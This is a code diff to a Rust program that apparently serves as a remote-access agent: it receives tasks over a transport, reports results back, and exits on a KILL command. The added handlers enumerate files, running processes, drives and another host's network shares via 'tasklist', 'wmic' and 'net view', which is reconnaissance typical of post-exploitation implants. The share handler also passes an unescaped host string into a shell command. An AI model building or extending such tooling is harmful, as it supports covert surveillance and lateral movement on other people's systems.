@@ -428,6 +428,103 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "LS" => {
             t.send_result(task.id, &ls(&task.args), "");
         }
+        "LS_JSON" => {
+            let dir = if task.args.trim().is_empty() { ".".to_string() } else { task.args.trim().to_string() };
+            match std::fs::canonicalize(&dir) {
+                Err(e) => {
+                    let j = serde_json::json!({"error": e.to_string()});
+                    t.send_result(task.id, &j.to_string(), "");
+                }
+                Ok(abs) => {
+                    let abs_str = abs.to_string_lossy().into_owned();
+                    let cwd = std::env::current_dir().map(|p| p.to_string_lossy().into_owned()).unwrap_or_default();
+                    let mut entries = Vec::new();
+                    if let Ok(rd) = std::fs::read_dir(&abs) {
+                        for e in rd.flatten() {
+                            let name = e.file_name().to_string_lossy().into_owned();
+                            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
+                            let (sz, modtime) = e.metadata().map(|m| {
+                                let sz = if is_dir { 0 } else { m.len() as i64 };
+                                let mod_str = m.modified().ok()
+                                    .and_then(|t| {
+                                        let secs = t.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs();
+                                        let dt_secs = secs as i64;
+                                        // Format as YYYY-MM-DD HH:mm (simple calc)
+                                        let days = dt_secs / 86400;
+                                        let rem  = dt_secs % 86400;
+                                        let hh   = rem / 3600;
+                                        let mm   = (rem % 3600) / 60;
+                                        // Days since 1970-01-01
+                                        let mut y = 1970i32; let mut d = days as i32;
+                                        loop {
+                                            let yd = if (y%4==0&&y%100!=0)||(y%400==0) {366} else {365};
+                                            if d < yd { break; } d -= yd; y += 1;
+                                        }
+                                        let mdays = [31i32,if(y%4==0&&y%100!=0)||(y%400==0){29}else{28},31,30,31,30,31,31,30,31,30,31];
+                                        let mut mo = 0usize;
+                                        while mo < 12 && d >= mdays[mo] { d -= mdays[mo]; mo += 1; }
+                                        Some(format!("{:04}-{:02}-{:02} {:02}:{:02}", y, mo+1, d+1, hh, mm))
+                                    }).unwrap_or_default();
+                                (sz, mod_str)
+                            }).unwrap_or((0, String::new()));
+                            entries.push(serde_json::json!({"name":name,"is_dir":is_dir,"size":sz,"mod":modtime}));
+                        }
+                    }
+                    let resp = serde_json::json!({"cwd": cwd, "path": abs_str, "entries": entries});
+                    t.send_result(task.id, &resp.to_string(), "");
+                }
+            }
+        }
+        "PS_JSON" => {
+            let raw = shell("tasklist /FO CSV /NH 2>&1");
+            let mut procs = Vec::new();
+            for line in raw.lines() {
+                let line = line.trim().trim_matches('"');
+                let parts: Vec<&str> = line.splitn(6, "\",\"").collect();
+                if parts.len() >= 2 {
+                    let name = parts[0].trim_matches('"');
+                    let pid_str = parts[1].trim_matches('"');
+                    if let Ok(pid) = pid_str.parse::<u32>() {
+                        procs.push(serde_json::json!({"pid": pid, "name": name, "security": ""}));
+                    }
+                }
+            }
+            t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
+        }
+        "DRIVES" => {
+            let raw = shell("wmic logicaldisk get name /format:list 2>&1");
+            let mut entries = Vec::new();
+            for line in raw.lines() {
+                let l = line.trim();
+                if let Some(rest) = l.strip_prefix("Name=") {
+                    let drive = rest.trim();
+                    if !drive.is_empty() {
+                        entries.push(serde_json::json!({"name": format!("{}\\", drive), "is_dir": true, "size": 0, "mod": ""}));
+                    }
+                }
+            }
+            let resp = serde_json::json!({"cwd": "", "path": "", "drives": true, "entries": entries});
+            t.send_result(task.id, &resp.to_string(), "");
+        }
+        "NET_SHARES" => {
+            let host = task.args.trim().trim_start_matches('\\').trim_start_matches('/');
+            let raw = shell(&format!("net view \\\\{} /all 2>&1", host));
+            let mut entries = Vec::new();
+            let mut parsing = false;
+            for line in raw.lines() {
+                let l = line.trim();
+                if l.contains("---") { parsing = true; continue; }
+                if !parsing || l.is_empty() { continue; }
+                let lower = l.to_lowercase();
+                if lower.contains("completed") || lower.contains("completado") { break; }
+                let parts: Vec<&str> = l.split_whitespace().collect();
+                if parts.len() >= 2 && matches!(parts[1].to_lowercase().as_str(), "disk" | "disco") {
+                    entries.push(serde_json::json!({"name": parts[0], "is_dir": true, "size": 0, "mod": ""}));
+                }
+            }
+            let resp = serde_json::json!({"cwd": "", "path": format!("\\\\{}", host), "shares": true, "entries": entries});
+            t.send_result(task.id, &resp.to_string(), "");
+        }
         "KILL" => {
             t.send_result(task.id, "bye", "");
             std::process::exit(0);
